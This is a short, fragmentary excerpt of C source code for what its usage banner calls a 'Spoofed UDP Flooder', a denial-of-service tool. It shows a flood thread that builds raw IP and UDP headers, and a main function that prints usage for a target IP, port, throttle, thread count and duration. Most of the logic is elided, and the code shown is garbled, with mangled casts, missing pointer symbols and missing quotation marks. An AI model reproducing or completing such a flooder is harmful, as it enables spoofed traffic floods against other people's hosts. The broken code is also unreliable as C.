...
void flood(void par1)
{
  ...
  struct udphdr udph = (u_int8_tvoid )iph + sizeof(struct iphdr);
...
int main(int argc, char argv[ ])
{
  if(argc  5){
    ...
    fprintf(stdout, Spoofed UDP Flooder v2.5.3 FINAL by ohnoes1479nUsage %s target IPhostname port to be flooded throttle (lower is faster) number threads to use time (optional)n, argv[0]);
    exit(-1);
  }
